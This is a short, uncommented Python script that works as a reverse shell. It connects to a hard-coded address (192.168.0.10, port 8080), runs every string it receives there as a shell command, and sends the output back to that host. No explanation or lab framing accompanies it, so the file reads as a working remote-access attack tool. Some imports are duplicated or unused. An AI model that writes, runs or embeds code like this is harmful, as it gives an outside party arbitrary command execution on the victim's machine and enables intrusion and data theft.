import socket
import http.server
import socketserver
import logging
import threading
import threading
import time
import logging
import subprocess
import os
import datetime



HOST = '192.168.0.10'
PORT = 8080



with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))



    while True:
            cmd = s.recv(1024).decode()


            try:
                result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
                print(result)
            except Exception as e:
                result = str(e).encode()

            if len(result) == 0:
                result = 'OK'.encode()


            s.send(result)

            #data = s.recv(1024)

            print('Received', repr(cmd))
